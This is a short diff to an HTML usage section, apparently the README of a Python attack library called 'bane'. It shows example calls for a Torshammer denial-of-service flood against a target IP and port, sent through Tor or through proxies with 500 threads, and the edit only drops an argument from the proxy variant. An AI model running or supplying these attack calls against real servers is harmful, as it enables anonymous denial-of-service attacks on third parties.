@@ -124,4 +124,4 @@ II-Usage:
 <h4>Torshammer attack:</h4>
 <br>bane.torshammer(IP, p= port , duration= 300 ,set_tor=False , threads=500 , timeout=5)
 <h4>Torshammer attack but through proxies instead of Tor:</h4>
-<br>bane.prox_hammer(IP, p= port , duration= 300 ,set_tor=False , threads=500 , timeout=5)
+<br>bane.prox_hammer(IP, p= port , duration= 300 , threads=500 , timeout=5)
